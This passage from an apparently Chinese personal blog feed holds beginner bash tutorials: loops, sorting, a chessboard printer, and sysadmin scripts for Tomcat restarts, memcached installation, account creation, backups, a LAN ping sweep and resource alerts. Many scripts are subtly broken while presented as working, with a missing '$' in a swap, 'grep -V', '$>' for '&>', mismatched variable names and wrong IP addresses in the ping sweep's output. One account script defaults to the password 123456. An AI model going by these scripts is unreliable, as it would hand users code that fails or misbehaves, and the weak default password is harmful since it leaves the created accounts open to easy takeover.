ai&quot;fi</code></pre><hr><p><strong>&#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;</strong></p><pre><code class="sh">#!/bin/bash# &#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;# &#x8BBE;&#x7F6E;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;i &#x548C; j&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x884C;&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5217;&#xFF0C;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x4E3A; 8x8&#x68CB;&#x76D8;# i=1 &#x662F;&#x4EE3;&#x8868;&#x51C6;&#x5907;&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;&#x68CB;&#x76D8;&#xFF0C;&#x7B2C;1&#x884C;&#x68CB;&#x76D8;&#x6709;&#x7070;&#x8272;&#x548C;&#x84DD;&#x8272;&#x95F4;&#x9694;&#x8F93;&#x51FA;&#xFF0C;&#x603B;&#x5171;&#x4E3A;8&#x5217;# i=1 &#xFF0C;j=1 &#x4EE3;&#x8868;&#x7B2C;1&#x884C;&#x7684;&#x7B2C;1&#x5217;&#xFF0C;i=2&#xFF0C;j=3&#x4EE3;&#x8868;&#x7B2C;2&#x884C;&#x7684;&#x7B2C;3&#x5217;# &#x68CB;&#x76D8;&#x7684;&#x89C4;&#x5F8B;&#x662F; i+j &#x5982;&#x679C;&#x662F;&#x5076;&#x6570;&#xFF0C;&#x5C31;&#x6253;&#x5370;&#x84DD;&#x8272;&#x8272;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x6280;&#x672F;&#x5C31;&#x6253;&#x5370;&#x7070;&#x8272;&#x8272;&#x5757;# &#x4F7F;&#x7528; echo -ne &#x6253;&#x5370;&#x8272;&#x5757;&#xFF0C;&#x5E76;&#x4E14;&#x6253;&#x5370;&#x5B8C;&#x6210;&#x8272;&#x5757;&#x540E;&#x4E0D;&#x81EA;&#x52A8;&#x6362;&#x884C;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x884C;&#x7EE7;&#x7EED;&#x8F93;&#x51FA;&#x5176;&#x4ED6;&#x8272;&#x5757;for i in {1..8}do    for j in {1..8}    do        sum=$[ i+j ]        if [ $[sum%2] -eq 0 ]; then            echo -ne &quot;\033[46m \033[0m&quot;        else            echo -ne &quot;\033[47m \033[0m&quot;        fi    done    echodone</code></pre><hr><p><strong>&#x4F7F;&#x7528;&#x811A;&#x672C;&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x4E09;&#x4E2A;&#x6574;&#x6570;&#x8FDB;&#x884C;&#x6392;&#x5E8F;</strong></p><pre><code class="sh">#!/bin/bash# &#x4E00;&#x6B21;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;3&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x811A;&#x672C;&#x6839;&#x636E;&#x6570;&#x5B57;&#x5927;&#x5C0F;&#x4F9D;&#x6B21;&#x6392;&#x5E8F;&#x8F93;&#x51FA;3&#x4E2A;&#x6570;&#x5B57;read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num1read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num2read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num3# &#x4E0D;&#x7BA1;&#x8C01;&#x5927;&#x8C01;&#x5C0F;&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x6253;&#x5370; echo &quot;$num1, $num2, $num3&quot;# num1 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5C0F;&#x7684;&#x503C;&#xFF0C;num2 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x4E2D;&#x95F4;&#x503C;&#xFF0C; num3&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5927;&#x503C;# &#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4E0D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x5219;&#x6539;&#x53D8;&#x6570;&#x7684;&#x5B58;&#x50A8;&#x4E66;&#x5E8F;&#xFF0C;&#x5982;&#xFF1A;&#x53EF;&#x4EE5;&#x5C06;num1&#x548C;num2&#x7684;&#x503C;&#x5BF9;&#x8C03;tmp=0# &#x5982;&#x679C;num1 &#x5927;&#x4E8E; num2 &#xFF0C;&#x5C31;&#x628A;num1&#x548C;num2&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num1 -gt $num2 ]; then    tmp=$num1    num1=$num2    num2=tmpfi# &#x5982;&#x679C;num1&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num1&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num1 -gt $num3 ]; then    tmp=$num1    num1=$num3    num3=$tmpfi# &#x5982;&#x679C;num2&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num2&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num2&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num2 -gt $num3 ]; then    tmp=$num2    num2=$num3    num3=$tmpfiecho &quot;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF08;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#xFF09;&#x4E3A;&#xFF1A;$num1,$num2,$num3&quot;</code></pre><hr><p><strong>for&#x5FAA;&#x73AF;&#x5224;&#x65AD;</strong></p><pre><code class="sh">#!/bin/bashs=0;for((i=1;i&lt;100;i++))do    s=$[$s+$i]doneecho $sr=0;a=0;b=0;for((x=1; x&lt;9; x++))do    a=$[$a+$x]    echo $xdonefor ((y=1; y&lt;9; y++))do    b=$[$b+$y]    echo $ydoneecho $r=$[$a+$b]</code></pre><pre><code class="sh">#!/bin/bashfor i in &quot;$*&quot;do    echo &quot;wenmin xihua $i&quot;donefor j in &quot;$@&quot;do    echo &quot;wenmin xihuan $j&quot;done</code></pre><hr><p><strong>&#x4F7F;&#x7528;&#x51FD;&#x6570; &#x6C42;&#x548C;&#x8FD0;&#x7B97;</strong></p><pre><code class="sh">#!/bin/bashfunction sum() {    s=0;    s=$[$1+$2]    echo $s}read -p &quot;input your parameter &quot; p1read -p &quot;input your parameter &quot; p2sum $p1 $p2function multi() {    r=0;    r=$[$1/$2]    echo $r}read -p &quot;input your parameter &quot; x1read -p &quot;input your parameter &quot; x2multi $x1 $x2v1=1v2=2let v3=$v1+$v2echo $v3</code></pre><hr><p><strong>case&#x2014;&#x2014;esac&#x5206;&#x652F;&#x7ED3;&#x6784;</strong></p><pre><code class="sh">#!/bin/bashcase $1 in1)    echo &quot;wenmin &quot;    ;;2)    echo &quot;wenxing &quot;    ;;3)    echo &quot;wemchang &quot;    ;;4)    echo &quot;yijun&quot;    ;;5)    echo &quot;sinian&quot;    ;;6)    echo &quot;sikeng&quot;    ;;7)    echo &quot;yanna&quot;    ;;*)    echo &quot;danlian&quot;    ;;esac</code></pre><hr><p><strong>&#x5BF9;&#x53D8;&#x91CF;&#x7684;&#x4F20;&#x5165;&#x4E0E;&#x83B7;&#x53D6;&#x4E2A;&#x6570;&#x53CA;&#x6253;&#x5370;</strong></p><pre><code class="sh">#!/bin/bashecho &quot;$0 $1 $2 $3&quot;  //&#x4F20;&#x5165;&#x56DB;&#x4E2A;&#x53C2;&#x6570;echo $# // &#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x6570;&#x91CF;echo $@ //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;echo $* //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;</code></pre><hr><p><strong>&#x811A;&#x672C;&#x5B9A;&#x4E49;while&#x5FAA;&#x73AF;&#x8BED;&#x53E5;</strong></p><pre><code class="sh">#!/bin/bashs=0i=1while [ $i -le 100 ]do    s=$[$s + $i ]    i=$[$i + 1]doneecho $secho $i</code></pre><hr><p><strong>&#x8BFB;&#x53D6;&#x63A7;&#x5236;&#x53F0;&#x4F20;&#x5165;&#x53C2;&#x6570;</strong></p><pre><code class="sh">#!/bin/bashread -t 7 -p &quot;input your name &quot; NAMEecho $NAMEread -t 11 -p &quot;input you age &quot; AGEecho $AGEread -t 15 -p &quot;input your friend &quot; FRIENDecho $FRIENDread -t 16 -p &quot;input your love &quot; LOVEecho $LOVE</code></pre><p><strong>&#x6253;&#x5370;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD;</strong></p><blockquote><p><strong>&#x63CF;&#x8FF0;</strong><br>&#x5199;&#x4E00;&#x4E2A;bash&#x811A;&#x672C;&#x4EE5;&#x7EDF;&#x8BA1;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6587;&#x4EF6;nowcoder.txt&#x4E2D;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD;<br>&#x793A;&#x4F8B;&#xFF1A;<br>&#x5047;&#x8BBE;nowcoder.txt&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;<br>how they are implemented and applied in computer<br>&#x4F60;&#x7684;&#x811A;&#x672C;&#x5E94;&#x5F53;&#x8F93;&#x51FA;&#xFF1A;<br>how<br>they<br>are<br>and<br>applied<br>in<br>&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x8981;&#x62C5;&#x5FC3;&#x4F60;&#x8F93;&#x51FA;&#x7684;&#x7A7A;&#x683C;&#x4EE5;&#x53CA;&#x6362;&#x884C;&#x7684;&#x95EE;&#x9898;</p></blockquote><pre><code class="shell">awk &apos;BEGIN{FS=&quot;&quot;;RS=&quot; &quot;;ORS=&quot;\n&quot;}{if(NF&lt;8)print$0}&apos; nowcoder.txt</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Hello World&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;sh&quot;&gt;#!/bin/bash
&amp;lt;!--more--&amp;gt;
function example {
    echo &amp;quot;Hello World&amp;quot;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL脚本工具</title>
    <link href="https://marnm.github.io//posts/f42b90f9/"/>
    <id>https://marnm.github.io//posts/f42b90f9/</id>
    <published>2022-06-07T04:52:33.000Z</published>
    <updated>2022-09-02T19:06:27.108Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&#x67E5;&#x770B;&#x6709;&#x591A;&#x5C11;&#x8FDC;&#x7A0B;&#x7684;IP&#x5728;&#x8FDE;&#x63A5;&#x672C;&#x673A;</strong></p><pre><code class="bash">#!/bin/bash&lt;!--more--&gt;netstat -atn | awk &apos;{print $5}&apos; | awk &apos;{print $1}&apos; | sort -nr | uniq -c</code></pre><p><strong>Get Tomcat PID</strong></p><pre><code class="bash">#!/bin/bashv1=&quot;Hello&quot;v2=&quot;world&quot;v3=${v1}${v2}echo $v3pidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -v &quot;grep&quot;|awk &apos;{print $2}&apos;`echo $pidlistecho &quot;tomcat id list :$pidlist&quot;  # &#x663E;&#x793A;PID</code></pre><p><strong>&#x6E90;&#x7801;&#x5B89;&#x88C5;memcached</strong></p><pre><code class="bash">#!/bin/bash# &#x4E00;&#x952E;&#x90E8;&#x7F72;memcached# &#x811A;&#x672C;&#x7528;&#x6E90;&#x7801;&#x6765;&#x5B89;&#x88C5;memcached&#x670D;&#x52A1;&#x5668;wget http://www.memcached.org/files/memcached-1.5.1.tar.gzyum -y install gcctar -xf memcached-1.5.1.tar.gzcd memcached-1.5.1./configuremake &amp;&amp; make install</code></pre><p><strong>&#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;</strong></p><pre><code class="bash">#!/bin/bash# &#x68C0;&#x6D4B;&#x672C;&#x673A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x8D85;&#x7EA7;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5219;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;vsftpd&#xFF0C;# &#x5982;&#x679C;&#x4E0D;&#x662F;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x60A8;&#x975E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;if [ $USER == &quot;root&quot; ]then    yum -y install vsftpdelse    echo &quot;&#x60A8;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&quot;fi</code></pre><p><strong>&#x6740;&#x6389;tomcat&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;</strong></p><pre><code class="bash">#!/bin/bash# kill tomcat pid# &#x627E;&#x5230;tomcat&#x7684;PIDpidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -V &quot;grep&quot;|awk &apos;{print $2}&apos;`echo &quot;tomcat ID LIST : $pidlist&quot;kill -9 $pidlistecho &quot;KILL $pidlist:&quot;echo &quot;service stop success&quot;echo &quot;start tomcat&quot;cd /opt/apache-tomcat-7.0.75pwdrm -rf work/*cd bin./startup.sh </code></pre><p><strong>&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x7528;&#x6237;&#x6570;</strong></p><pre><code class="bash">#!/bin/bash# &#x7EDF;&#x8BA1;&#x5F53;&#x524D;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8D26;&#x6237;&#x6709;&#x591A;&#x5C11;&#x4E2A;# &#x65B9;&#x6CD5;1&#xFF1B;grep &quot;bash$&quot; /etc/passwd | wc -l# &#x65B9;&#x6CD5;2&#xFF1B;awk -f : &apos;/bash$/{x++}end{print x}&apos; /etc/passwd</code></pre><p><strong>&#x5907;&#x4EFD;MySQL&#x8868;&#x6570;&#x636E;</strong></p><pre><code class="bash">#!/bin/bashsource /etc/profiledbName=mysqltableName=dbecho [`date+&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos; start loading data....&apos;mysql -uroot -P3306 ${ddbName} -e &quot;LOAD DATA LOCAL INFILE &apos;# /home/wenmin/wenxing.txt&apos; INTO TABLE ${tableName} FIELDS TERMINATED BY &apos;;&apos;&quot;echo [`date +&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos;end loading data...&apos;exit</code></pre><p><strong>&#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;</strong></p><pre><code class="bash">#!/bin/bash# &#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;while :do    echo &apos;&#x672C;&#x5730;&#x7F51;&#x5361; eth0 &#x6D41;&#x91CF;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;&apos;    ifconfig eth0 | grep &quot;RX pack&quot; | awk &apos;{print $5}&apos;    ifconfig eth0 | grep &quot;TX pack&quot; | awk &apos;{print $5}&apos;done</code></pre><p><strong>&#x6D4B;&#x8BD5;192.168.4.0/24&#x6574;&#x4E2A;&#x7F51;&#x6BB5;&#x4E2D;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5F00;&#x673A;&#x72B6;&#x6001;&#xFF0C;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5173;&#x673A;&#x72B6;&#x6001;</strong></p><pre><code class="bash">for i in {1..254}do    # &#x6BCF;&#x9694;0.3&#x79D2;ping&#x4E00;&#x6B21;&#xFF0C;&#x4E00;&#x5171;ping2&#x6B21;&#xFF0C;&#x5E76;&#x4EE5;1&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#x8BBE;&#x7F6E;ping&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;    ping -c 2 -i 0.3 -W 1 192.168.1.$i $&gt; /dev/null    if [ $? -eq 0 ]; then        echo &quot;192.168.4.$i is up&quot;    else        echo &quot;192.168.168.4.$i is down&quot;    fidone</code></pre><p><strong>&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;</strong></p><pre><code class="bash">#!/bin/bash# &#x7F16;&#x5199;&#x811A;&#x672C;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;# &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;# &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x7EDF;&#x4E00;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;123456&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#xFF1A;&quot; user# &#x4F7F;&#x7528;-z&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x7A7A;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;&#xFF0C;&#x9000;&#x51FA;&#x7801;&#x4E3A;2# &#x6CA1;&#x6709;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x811A;&#x672C;&#x9000;&#x51FA;&#x540E;&#xFF0C;&#x4F7F;&#x7528;$?&#x67E5;&#x770B;&#x7684;&#x8FD4;&#x56DE;&#x7801;&#x4E3A;2if [ -z $user ]; then    echo &quot; &#x60A8;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&quot;    exit 2fi# &#x4F7F;&#x7528;stty -echo&#x5173;&#x95ED;shell&#x7684;&#x56DE;&#x663E;&#x529F;&#x80FD;stty -echoread -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF1A;&quot;passstty echopass=${pass:-123456}useradd &quot;$user&quot;echo &quot;$pass&quot; | passwd --stdin &quot;$user&quot;</code></pre><p><strong>&#x6BCF;&#x5468;5&#x4F7F;&#x7528;tar&#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/log&#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</strong></p><pre><code class="bash">#!/bin/bash# &#x6BCF;&#x5468; 5 &#x4F7F;&#x7528; tar &#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/log &#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;# vim  /root/logbak.sh# &#x7F16;&#x5199;&#x5907;&#x4EFD;&#x811A;&#x672C;,&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x5305;&#x542B;&#x65E5;&#x671F;&#x6807;&#x7B7E;,&#x9632;&#x6B62;&#x540E;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x5C06;&#x524D;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x8986;&#x76D6;# &#x6CE8;&#x610F; date &#x547D;&#x4EE4;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x53CD;&#x5F15;&#x53F7;&#x62EC;&#x8D77;&#x6765;,&#x53CD;&#x5F15;&#x53F7;&#x5728;&#x952E;&#x76D8;&lt;tab&gt;&#x952E;&#x4E0A;&#x9762;tar -czf log-`date +%Y%m%d`.tar.gz /var/log# crontab -e #&#x7F16;&#x5199;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6267;&#x884C;&#x5907;&#x4EFD;&#x811A;&#x672C;00 03 * * 5 /home/wenming/datas/logbak.sh</code></pre><p><strong>&#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;&#xFF0C;&#x5BF9; tomcat &#x72B6;&#x6001;&#x8FDB;&#x884C;&#x91CD;&#x542F;&#x6216;&#x7EF4;&#x62A4;</strong></p><pre><code class="bash">#!/bin/bash# function:&#x81EA;&#x52A8;&#x76D1;&#x63A7;tomcat&#x8FDB;&#x7A0B;&#xFF0C;&#x6302;&#x4E86;&#x5C31;&#x6267;&#x884C;&#x91CD;&#x542F;&#x64CD;&#x4F5C;# author&#xFF1A;huanghong# DEFINE# &#x83B7;&#x53D6;tomcat PPIDtomcatID=$(ps -ef |grep tomcat | grep -w &apos;apache-tomcat-7.0.75&apos; |grep -v &apos;grep&apos; |awk &apos;{print $2}&apos;)# tomcat_startupStartTomcat=/opt/apache-tomcat-7.0.75/bin/startup.sh# TomcatCache=/user/apache-tomcat-5.5.23/work#&#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;WebURL=http://192.168.242.113:8080/# &#x65E5;&#x5FD7;&#x8F93;&#x51FA;GetPageInfo=/dev/nullTomcatMonitorLog=/tmp/TomcatMonitor.logMonitor() {    echo &quot;[info]&#x5F00;&#x59CB;&#x76D1;&#x63A7;tomcat...[$(date +&apos;%F %H:%M:%S&apos;)]&quot;    if [$TomcatID]    then        echo &quot;[info]tomcat&#x8FDB;&#x7A0B;ID&#x4E3A;:$tomcatID.&quot;        # &#x83B7;&#x53D6;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;        TomcatServiceCode=$(curl -s -o $GetPageInfo -m 10 --connect-timeout 10 $WebURL -w %{http_code})        if [ $TomcatServiceCode -eq 200 ]; then            echo &quot;&quot;[info]&#x8FD4;&#x56DE;&#x7801;&#x4E3A;$TomcatServiceCode,tomcat&#x542F;&#x52A8;&#x6210;&#x529F;,&#x9875;&#x9762;&#x6B63;&#x5E38;.&quot;&quot;        else            echo &quot;[error]&#x8BBF;&#x95EE;&#x51FA;&#x9519;&#xFF0C;&#x72B6;&#x6001;&#x7801;&#x4E3A;$TomcatServiceCode,&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5DF2;&#x8F93;&#x51FA;&#x5230;$GetPageInfo&quot;              echo &quot;[error]&#x5F00;&#x59CB;&#x91CD;&#x542F;tomcat&quot;             kill -9 $tomcatID # &#x6740;&#x6389;tomcat&#x8FDB;&#x7A0B;            sleep 3            # rm -rf $TomcatCache            $StartTomcat        fi        else            echo &quot;[error]&#x8FDB;&#x7A0B;&#x4E0D;&#x5B58;&#x5728;&#xFF01;tomcat&#x81EA;&#x52A8;&#x91CD;&#x542F;...&quot;            echo &quot;[info]$StartTomcat, &#x8BF7;&#x7A0D;&#x4FAF;.......&quot;            $StartTomcat        fi        echo &quot;---------------------------------------&quot;}Monitor &gt;&gt; $TomCatMonitorLog</code></pre><p><strong>&#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;</strong></p><pre><code class="bash">#!/bin/bash# &#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;# $1&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$2&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;useradd &quot;$1&quot;echo &quot;$2&quot; | passwd --stdin &quot;$1&quot;</code></pre><p><strong>&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;</strong></p><pre><code class="bash">#!/bin/bash# &#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;# &#x63D0;&#x53D6;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;dis_sike=$(free | awk &apos;/Mem/{print $4}&apos;)while:do    # &#x6CE8;&#x610F;&#x5185;&#x5B58;&#x548C;&#x78C1;&#x76D8;&#x63D0;&#x53D6;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x90FD;&#x662F;&#x4EE5;kb&#x4E3A;&#x5355;&#x4F4D;    if [ $disk_size -le 512000 -a $mem_size -le 1024000 ]    then        mail -s &quot;Warning&quot; root &lt;&lt;EOF        Insufficient resource,&#x8D44;&#x6E90;&#x4E0D;&#x8DB3;        EOF    fidone</code></pre><p><strong>&#x4E00;&#x952E;&#x90E8;&#x7F72;LAMP&#xFF08;rpm&#xFF09;</strong></p><pre><code class="bash">#!/bin/bash# &#x4E00;&#x952E;&#x90E8;&#x7F72; LNMP(RPM &#x5305;&#x7248;&#x672C;)# &#x4F7F;&#x7528; yum &#x5B89;&#x88C5;&#x90E8;&#x7F72; LNMP,&#x9700;&#x8981;&#x63D0;&#x524D;&#x914D;&#x7F6E;&#x597D; yum &#x6E90;,&#x5426;&#x5219;&#x8BE5;&#x811A;&#x672C;&#x4F1A;&#x5931;&#x8D25;# &#x672C;&#x811A;&#x672C;&#x4F7F;&#x7528;&#x4E8E; centos7.2 &#x6216; RHEL7.2yum install -y httpdyum install -y mariadb mariadb-devel mariadb-serveryum install -y httpdyum install -y php php-mysqlsystemctl start httpd mariadbsystemctl enable httpd mariadb</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            